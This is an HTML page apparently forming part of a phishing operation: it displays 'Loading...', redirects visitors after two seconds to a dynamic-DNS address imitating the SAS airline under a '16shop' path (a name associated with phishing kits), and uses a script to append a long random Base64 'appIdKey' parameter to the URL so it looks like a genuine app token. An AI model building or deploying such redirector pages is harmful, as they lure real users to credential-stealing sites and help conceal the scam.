
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Loading...</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.6.1/jquery.min.js"></script>


<script type="text/javascript">
	$(window).load(function () {
    window.setTimeout(function () {
        window.location.href = "https://flysas.getmyip.com/no/16shop/?p=FLJuX";
    }, 2000)
});
</script>

<script type="text/javascript">

function addRandomBase64ToUrl() {
  // Generate a much longer random string (e.g., 2048 characters or more)
  const randomString = Array(64).fill().map(() => Math.random().toString(36).substring(2)).join('');

  // Encode the random string in Base64
  const base64String = btoa(randomString);

  // Get the current URL
  const currentUrl = window.location.href;

  // Append the Base64 string as a query parameter
  const newUrl = currentUrl.includes('?') 
                 ? `${currentUrl}&appIdKey=${base64String}` 
                 : `${currentUrl}?appIdKey=${base64String}`;

  // Update the browser's URL (without reloading the page)
  window.history.pushState({ path: newUrl }, '', newUrl);

  console.log("New URL with Base64 added: ", newUrl);
}

// Call the function to add the long Base64 string
addRandomBase64ToUrl();


</script>
